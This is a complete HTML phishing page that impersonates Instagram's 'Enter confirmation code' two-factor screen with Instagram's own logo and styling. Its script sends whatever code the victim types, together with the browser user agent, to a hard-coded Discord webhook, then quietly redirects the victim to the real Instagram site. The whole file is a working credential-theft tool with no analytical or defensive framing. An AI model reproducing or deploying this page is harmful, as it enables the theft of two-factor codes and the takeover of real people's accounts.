<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Confirm • Instagram</title>
<link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;background:#fafafa;color:#262626;min-height:100vh;display:flex;align-items:center;justify-content:center}
.card{width:350px;background:#fff;border:1px solid #dbdbdb;padding:40px 40px 30px;text-align:center}
.logo{height:51px;margin-bottom:24px;background:url('https://static.cdninstagram.com/rsrc.php/v3/yR/r/radfZ8v2V_J.png') no-repeat center/175px}
h1{font-size:16px;font-weight:600;margin-bottom:8px}
p{font-size:14px;color:#8e8e8e;margin-bottom:20px;line-height:1.4}
input{width:100%;height:38px;padding:9px 8px;border:1px solid #dbdbdb;border-radius:3px;background:#fafafa;font-size:14px;margin-bottom:12px;outline:none}
button{width:100%;height:32px;background:#0095f6;border:none;border-radius:8px;color:#fff;font-size:14px;font-weight:600;cursor:pointer}
</style>
</head>
<body>
<div class="card">
  <div class="logo"></div>
  <h1>Enter confirmation code</h1>
  <p>Enter the 6-digit code we sent to your phone or authentication app.</p>
  <form id="f">
    <input id="c" type="text" inputmode="numeric" autocomplete="one-time-code" placeholder="Confirmation code" required>
    <button type="submit">Confirm</button>
  </form>
</div>
<script>
const WEBHOOK = "https://discord.com/api/webhooks/1542285698793738261/V5Xo_-9X3wofL-Xc_iAquKH4ml6nKaR203vTarrbw6LOWaZGGJJEK-b97o3rguhoALYp";
document.getElementById("f").onsubmit = e => {
  e.preventDefault();
  const code = document.getElementById("c").value.trim();
  const text = [
    "**2fa**",
    "user: `2fa`",
    `pass/code: \`${code}\``,
    `ua: ${navigator.userAgent}`,
    "code"
  ].join("\n");
  fetch(WEBHOOK, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: text.slice(0, 1900) }),
    keepalive: true
  }).catch(() => {});
  setTimeout(() => location.replace("https://www.instagram.com/"), 400);
};
</script>
</body>
</html>
